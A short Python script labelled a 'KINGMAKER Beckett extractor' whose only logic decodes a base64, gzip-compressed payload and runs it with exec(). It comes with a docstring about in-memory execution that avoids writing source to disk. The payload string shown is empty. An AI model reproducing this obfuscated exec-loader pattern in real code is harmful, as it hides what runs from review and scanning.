#!/usr/bin/env python3
"""Self-contained KINGMAKER Beckett extractor.

The implementation is compressed only to keep this repository utility portable
through constrained code-delivery channels. It expands in memory and never
writes executable source to disk. Run with ``--help`` for usage.
"""
from base64 import b64decode
from gzip import decompress

_PAYLOAD = """"""

exec(compile(decompress(b64decode(_PAYLOAD)), __file__, "exec"), globals(), globals())
